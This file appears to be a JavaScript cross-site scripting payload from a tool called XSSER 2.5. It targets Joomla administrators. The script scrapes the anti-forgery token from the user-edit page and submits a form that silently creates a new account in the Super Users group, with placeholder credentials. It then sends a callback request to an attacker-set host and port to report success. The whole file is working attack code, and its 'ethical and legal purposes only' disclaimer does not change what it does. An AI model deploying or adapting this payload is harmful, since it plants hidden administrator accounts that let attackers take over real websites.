// Original authors: Gökmen Güreçi & Muhammet Dilmaç 
// Modified by Hans-Michael Varbaek for the XSSER 2.5
//
// For ethical and legal purposes only. This script is provided as is and without warranty.

var request = new XMLHttpRequest();
var req = new XMLHttpRequest();
var id = '';
var boundary = Math.random().toString().substr(2);
var space = "-----------------------------";

request.open('GET', 'index.php?option=com_users&view=user&layout=edit', true);
request.onload = function() {
    if (request.status >= 200 && request.status < 400) {
        var resp = request.responseText;
        var myRegex = /<input type="hidden" name="([a-z0-9]+)" value="1" \/>/;
        id = myRegex.exec(resp)[1];
        req.open('POST', 'index.php?option=com_users&layout=edit&id=0', true);
        req.setRequestHeader("content-type", "multipart/form-data; boundary=---------------------------" + boundary);
        var multipart = space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[name]\"" +
            "\r\n\r\nVAR_SHOWN_NAME\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[username]\"" +
            "\r\n\r\nVAR_USER_NAME\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[password]\"" +
            "\r\n\r\nVAR_PASSWORD_1\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[password2]\"" +
            "\r\n\r\nVAR_PASSWORD_2\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[email]\"" +
            "\r\n\r\nVAR_EMAIL\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[registerDate]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[lastvisitDate]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[lastResetTime]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[resetCount]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[sendEmail]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[block]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[requireReset]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[id]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[groups][]\"" +
            "\r\n\r\n8\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][admin_style]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][admin_language]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][language]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][editor]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][helpsite]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][timezone]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"task\"" +
            "\r\n\r\nuser.apply\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"" + id + "\"" +
            "\r\n\r\n1\r\n" +
            space + boundary + "--\r\n";
        req.onload = function() {
            if (req.status >= 200 && req.status < 400) {
                var resp = req.responseText;
                console.log(resp);
            }
        };
        req.send(multipart);
    }
};

request.send();

   // NEW FEATURE (Callback Notification)
   var request2 = new XMLHttpRequest(); // Initiate XMLHttpRequest
   request2.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt"); // Method and URL to send the request to - Hostname and port are set by xsser.py
   request2.send(); // Send the request

//Joomla.checkAll(this); // For auto self-clean up later
